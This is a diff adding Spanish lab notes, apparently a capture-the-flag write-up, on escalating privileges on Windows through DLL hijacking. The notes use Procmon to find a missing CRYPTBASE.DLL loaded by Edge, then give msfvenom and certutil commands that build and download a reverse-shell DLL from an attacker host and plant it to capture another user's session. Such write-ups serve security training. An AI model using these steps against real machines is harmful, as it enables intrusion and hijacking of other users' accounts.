@@ -1,0 +1,38 @@
+Root.txt
+
+Miramos nuestros privilegios:
+    - whoami /All
+    - net user username 
+Y vemos que estamos en un grupo local, miramos si tiene alguna descripcion:
+    - net localgroup ProcessMonitor
+
+Parece que podemos ejecutar que se llama Procmon64.exe, miramos por internet y veo la siguiente url:
+https://docs.microsoft.com/en-us/sysinternals/downloads/procmon
+
+Parece que podemos buscar informacion de los procesos en activo.
+
+Vamos a intentar un DLL Hijacking, para ello tenenmos que buscar un servicio que use un fichero dll pero que este no exista, para luego meter el nuestro crearnos uno y ejecutar codigo.
+
+Ponemos dos filtros en el programa:
+    - En display entries matching ponemos "Path", "contains", ".dll" y le damos a add.
+    - En display entries matching ponemos "Result", "contains", "name not found" y le damos a add.
+Pero no parece que haya nada interesante. Probamos abrir alguna aplicacion como el edge y volver a ejecutar los filtros.
+Nos fijamos en un servicio llamado msedge.exe del edge. 
+
+Intenta acceder al C:\Program Files (x86)\Microsoft\Edge\Application\CRYPTBASE.DLL pero no existe. Vamos a intentar reemplazarlo.
+
+Creamos un dll con msfvenom:
+    - msfvenom -p windows/x64/powershell_reverse_tcp -ax64 LHOST=IP LPORT=PORT -f dll > evil.dll
+
+Nos lo descargamos en la maquina:
+    - python3 -m http.server 
+    - certutil -f -split -urlcache http://IP:PORT/evil.dll
+
+Le cambiamos le nombre y lo ponemos en el path correspondiente:
+    - cp evil.dll "C:\Program Files (x86)\Microsoft\Edge\Application\CRYPTBASE.DLL"
+
+Abrimos el edge para comprobar su funciona.
+
+Ahora esperamos a que otro usuario abra el edge y asi conectarnos como el. Tardara un minuto mas o menos.
+
+Este ataque se puede hacer con cualquier .dll que aparezca al filtrar, pero debemos tener perisos de escritura en ese directorio.
